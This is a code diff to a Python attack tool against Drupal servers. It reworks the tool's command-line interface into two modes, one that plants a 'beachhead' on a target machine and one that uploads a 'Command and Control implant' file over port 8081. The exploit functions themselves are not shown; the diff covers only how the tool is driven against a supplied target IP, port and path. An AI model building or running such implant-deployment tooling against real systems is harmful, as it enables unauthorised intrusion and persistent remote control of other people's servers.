@@ -82,18 +82,27 @@ def implant_cnc(ip_addr, port, path, implant_file_path):
 
 if __name__ == "__main__":
     import argparse
-
     parser = argparse.ArgumentParser()
 
-    parser.add_argument("--ip", required=True, help="IP address of the target machine")
-    parser.add_argument("--port", required=True, help="Port of the Drupal server")
-    parser.add_argument("--path", required=True, help="Path to the Drupal server")
-    parser.add_argument("--implant", required=True, help="Path to the implant file")
+    modes = parser.add_subparsers(dest="mode", required=True)
+
+    beachhead = modes.add_parser("implant-beachhead", help="Implant the beachhead")
+    cnc = modes.add_parser("implant-cnc", help="Implant the Command and Control implant")
+
+    beachhead.add_argument("--ip", required=True, help="IP address of the target machine")
+    beachhead.add_argument("--port", required=True, help="Port of the Drupal server")
+    beachhead.add_argument("--path", required=True, help="Path to the Drupal server")
+
+    cnc.add_argument("--ip", required=True, help="IP address of the target machine")
+    cnc.add_argument("--port", required=True, help="Port of the Drupal server")
+    cnc.add_argument("--path", required=True, help="Path to the Drupal server")
+    cnc.add_argument("--implant", required=True, help="Path to the implant file")
+
     args = parser.parse_args()
 
-    implant_beachhead(args.ip, args.port, args.path)
-
-    # Wait for the beachhead to be implanted before implanting the CNC
-    time.sleep(1)
-
-    implant_cnc(args.ip, "8081", args.path, args.implant)
+    if args.mode == "implant-beachhead":
+        implant_beachhead(args.ip, args.port, args.path)
+    elif args.mode == "implant-cnc":
+        implant_cnc(args.ip, "8081", args.path, args.implant)
+    else:
+        print("Invalid mode")
